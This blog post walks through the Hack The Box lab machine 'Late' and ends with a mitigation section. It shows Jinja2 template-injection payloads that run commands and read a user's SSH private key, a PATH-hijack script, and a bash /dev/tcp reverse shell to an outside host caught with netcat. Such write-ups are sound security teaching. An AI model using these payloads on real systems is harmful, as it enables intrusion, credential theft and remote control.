---
layout: post
title: Hack The Box Walkthrough - Late
date: 2022-05-29
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
permalink: /2022/05/HTB/Late
img: 2022/05/Late/Late.png
---

* Room: Late
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/Late](https://app.hackthebox.com/machines/Late)
* Author: [kavigihan](https://app.hackthebox.com/users/389926)

## Enumeration

I started the machine by looking for opened ports.

```bash
$ rustscan -a target.htb -- -A -Pn | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :                                                                                                                                                                                                    --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.114.37:22
Open 10.129.114.37:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-08 11:13 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
...

Scanned at 2022-05-08 11:13:33 EDT for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSqIcUZeMzG+QAl/4uYzsU98davIPkVzDmzTPOmMONUsYleBjGVwAyLHsZHhgsJqM9lmxXkb8hT4ZTTa1azg4JsLwX1xKa8m+RnXwJ1DibEMNAO0vzaEBMsOOhFRwm5IcoDR0gOONsYYfz18pafMpaocitjw8mURa+YeY21EpF6cKSOCjkVWa6yB+GT8mOcTZOZ
StRXYosrOqz5w7hG+20RY8OYwBXJ2Ags6HJz3sqsyT80FMoHeGAUmu+LUJnyrW5foozKgxXhyOPszMvqosbrcrsG3ic3yhjSYKWCJO/Oxc76WUdUAlcGxbtD9U5jL+LY2ZCOPva1+/kznK8FhQN
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBMen7Mjv8J63UQbISZ3Yju+a8dgXFwVLgKeTxgRc7W+k33OZaOqWBctKs8hIbaOehzMRsU7ugP6zIvYb25Kylw=
|   256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIGrWbMoMH87K09rDrkUvPUJ/ZpNAwHiUB66a/FKHWrj
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
|_http-favicon: Unknown favicon MD5: 1575FDF0E164C3DB0739CF05D9315BDF
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:13
Completed NSE at 11:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:13
Completed NSE at 11:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:13
Completed NSE at 11:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.08 seconds
```

There were two opened ports:
* 22 (SSH)
* 80 (HTTP)

## Web

I opened the site in a web browser.

![Main Web Site](/assets/images/2022/05/Late/WebSite.png "Main Web Site")

It was the site for the 'Best online image tools'.

I scanned the site for any interesting hidden files and folders. But it did not find anything of interest.

```bash
 feroxbuster -u http://target.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://target.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      230l     1009w     9461c http://target.htb/
301      GET        7l       13w      194c http://target.htb/assets => http://target.htb/assets/
301      GET        7l       13w      194c http://target.htb/assets/css => http://target.htb/assets/css/
200      GET      230l     1009w     9461c http://target.htb/index.html
301      GET        7l       13w      194c http://target.htb/assets/fonts => http://target.htb/assets/fonts/
301      GET        7l       13w      194c http://target.htb/assets/images => http://target.htb/assets/images/
301      GET        7l       13w      194c http://target.htb/assets/js => http://target.htb/assets/js/
[####################] - 11s    32991/32991   0s      found:7       errors:0
[####################] - 9s      4713/4713    671/s   http://target.htb
[####################] - 8s      4713/4713    663/s   http://target.htb/
[####################] - 8s      4713/4713    639/s   http://target.htb/assets
[####################] - 7s      4713/4713    614/s   http://target.htb/assets/css
[####################] - 7s      4713/4713    649/s   http://target.htb/assets/fonts
[####################] - 7s      4713/4713    616/s   http://target.htb/assets/images
[####################] - 7s      4713/4713    606/s   http://target.htb/assets/js
```

The site had a contact form, I tried submitting something, but it just reloaded the page. Without posting my data.

The main page had a link to a free photo editor at 'http://images.late.htb/'. I added that domain to my hosts file and launched wfuzz to scan for other subdomains.


```bash
$ wfuzz -c -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -t30 --hw 1009 -H "Host:FUZZ.late.htb" "http://late.htb/"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://late.htb/
Total requests: 5000

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000053:   200        63 L     152 W      2187 Ch     "images"
000002700:   400        7 L      13 W       182 Ch      "m."
000002795:   400        7 L      13 W       182 Ch      "ns2.cl.bellsouth.net."
000002885:   400        7 L      13 W       182 Ch      "ns2.viviotech.net."
000002883:   400        7 L      13 W       182 Ch      "ns1.viviotech.net."
000003050:   400        7 L      13 W       182 Ch      "ns3.cl.bellsouth.net."
000004083:   400        7 L      13 W       182 Ch      "quatro.oweb.com."
000004082:   400        7 L      13 W       182 Ch      "jordan.fortwayne.com."
000004081:   400        7 L      13 W       182 Ch      "ferrari.fortwayne.com."

Total time: 10.84990
Processed Requests: 5000
Filtered Requests: 4991
Requests/sec.: 460.8336
```

There were no other subdomains to be found. I opened the image editor site. 

![Image Converter](/assets/images/2022/05/Late/ConvertImageToText.png "Image Converter")

I tried uploading an image. The site extracted the text from the image and returned it as a text file. I tried uploading a Python file, but it was rejected. I made a screenshot of some Python code and uploaded it. It returned the code as text without executing it. 

From there, I tried enumerating for more files in the images subdomain. I also tried to fuzz for different parameters. I didn't find anything. 

I searched for how the image was converted to text with Python and found [a GitHub repository](https://github.com/nikssardana/flaskOcr). It looked like it was doing the exact same thing as the site from the box. 

I looked for flaws in that code. I saw it was using a template to return the text found in the image. If the site from the challenge did the same thing, it might have been vulnerable to [Server Site Template Injection (SSTI)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection).

To test it, I created a text file with a simple template and made a screenshot of it. 

```
{% raw %}{{ 7 * 7 }}{% endraw %}
```

When I uploaded the image, I got this back:

```html
<p>49
</p>
```

It looks like I could get it to execute some code. Next, I tried to get it to run a command on the server. 


```
{% raw %}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{% endraw %}
```

Which returned this:

```html
<p>uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)
{
</p>
```

I was able to run commands on the server. I tried using the SSTI to get a reverse shell. This part was frustrating. The code would sometimes fail to execute. Other times it would miss some characters. I spent an over hour trying to send the code for a reverse shell. Appending it a few characters at the time to a file. 

Eventually, I decided to try something simpler and looked for a private key in the user's home folder. Luckily, I had an error that showed me that the application was located in an app folder inside the user's home. So I knew I just had to go up one folder.

```
{% raw %}
 {{ config.__class__.__init__.__globals__['os'].popen('cat ../.ssh/id_rsa').read() }}
{% endraw %}
```

It worked!

```bash
-----BEGIN RSA PRIVATE KEY-----
REDACTED
-----END RSA PRIVATE KEY-----
```

I saved the key locally, change its permissions, and used it to connect to the server.

```bash
$ ssh -i id_rsa svc_acc@target.htb

svc_acc@late:~$ ls -la
total 40
drwxr-xr-x 7 svc_acc svc_acc 4096 Apr  7 13:51 .
drwxr-xr-x 3 root    root    4096 Jan  5 10:44 ..
drwxrwxr-x 7 svc_acc svc_acc 4096 Apr  4 13:28 app
lrwxrwxrwx 1 svc_acc svc_acc    9 Jan 16 18:45 .bash_history -> /dev/null
-rw-r--r-- 1 svc_acc svc_acc 3771 Apr  4  2018 .bashrc
drwx------ 3 svc_acc svc_acc 4096 Apr  7 13:51 .cache
drwx------ 3 svc_acc svc_acc 4096 Jan  5 10:45 .gnupg
drwxrwxr-x 5 svc_acc svc_acc 4096 Jan  5 12:13 .local
-rw-r--r-- 1 svc_acc svc_acc  807 Apr  4  2018 .profile
drwx------ 2 svc_acc svc_acc 4096 Apr  7 11:08 .ssh
-rw-r----- 1 svc_acc svc_acc   33 May 29 13:03 user.txt

svc_acc@late:~$ cat user.txt
REDACTED
```

## Getting root

I started looking for ways to elevate my privileges. I could not run sudo without the user's password and I did not find any interesting executable with the suid bit set. There was a sendmail cron running every 20 minutes. It was not running as root. I had no idea if I could get anything out ot it. So I kept on looking.

I used scp to send [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) to the server, then ran it. 

If found that the PATH variable contained the folder `/usr/local/sbin` that was writeable.

```bash
svc_acc@late:~$ ls -ld /usr/local/sbin/
drwxr-xr-x 2 svc_acc svc_acc 4096 May 29 17:35 /usr/local/sbin/

svc_acc@late:~$ ls -la /usr/local/sbin/
total 12
drwxr-xr-x  2 svc_acc svc_acc 4096 May 29 17:37 .
drwxr-xr-x 10 root    root    4096 Aug  6  2020 ..
-rwxr-xr-x  1 svc_acc svc_acc  433 May 29 17:37 ssh-alert.sh

svc_acc@late:~$ cat /usr/local/sbin/
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi
```

I looked for what was using this file to see if it was useful.

```
svc_acc@late:~$ grep -R ssh-alert.sh /etc/ 2>/dev/null 
/etc/pam.d/sshd:session required pam_exec.so /usr/local/sbin/ssh-alert.sh

svc_acc@late:~$ cat /etc/pam.d/sshd                     
# PAM configuration for the Secure Shell service                                                                     

...

# Execute a custom script
session required pam_exec.so /usr/local/sbin/ssh-alert.sh
```

The script was executed when an ssh session was opened. I tried to modify it, but I was not allowed to do it. 

The script was calling `date` and `uname` without providing the full path. Since I was able to write to `/usr/local/sbin` and it was at the beginning of the PATH variable. I could write a script that would be executed instead of those commands.

I tested it with a simple call to `touch`.

```bash
svc_acc@late:~$ cat /usr/local/sbin/date
#!/bin/bash

touch /tmp/date
svc_acc@late:~$ chmod +x /usr/local/sbin/date
```

I opened another ssh connection, the `/tmp/date` file appeared, and it was owned by root.

```bash
svc_acc@late:~$ ls -ltr /tmp/
total 16
drwx------ 3 root root 4096 May 29 16:34 systemd-private-5ce7c05c39994fea968a4b84ceeba228-systemd-timesyncd.service-GeuFul
drwx------ 3 root root 4096 May 29 16:34 systemd-private-5ce7c05c39994fea968a4b84ceeba228-systemd-resolved.service-mFKWp7
drwx------ 3 root root 4096 May 29 16:34 systemd-private-5ce7c05c39994fea968a4b84ceeba228-ModemManager.service-i46q88
drwx------ 2 root root 4096 May 29 16:35 vmware-root_757-4281843244
-rw-rw-r-- 1 root root    0 May 29 17:53 date
```

I modified the `date` script to open a reverse shell to my machine. 


```bash
svc_acc@late:~$ cat /usr/local/sbin/date
#!/bin/bash

echo 'bash  -i >& /dev/tcp/10.10.14.122/4444 0>&1 ' | bash
```

I launched a netcat listener. It got a hit as soon as I reconnected to ssh.

```bash
$ nc -klvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.107.177 52396
bash: cannot set terminal process group (3334): Inappropriate ioctl for device
bash: no job control in this shell

root@late:/# whoami
whoami
root

root@late:/# cat /root/root.txt
cat /root/root.txt
REDACTED
root@late:/# 
```

## Mitigation

The first vulnerability of the box is the SSTI. 

```python
results = """<p>{}</p>""".format(scanned_text)

r = render_template_string(results)
path = misc_dir + "/" + ID + '_' + 'results.txt'

with open(path, 'w') as f:
    f.write(r)
```

This code takes the text extracted from the image and render is as a template. So any Jinja2 tags will be interpreted. 

If the code wrote `results` to the text file without rendering it as a template, the SSTI would have failed.

```html
{% raw %}
<p>{{ 7 * 7 }}
</p>
{% endraw %}
```

The escalation was possible because the script was using commands without specifying their full path. Since I was able to write in a folder that was part of the PATH, I could get my code executed. The script should use full paths. And the `/usr/local/sbin` folder should not be writeable. 



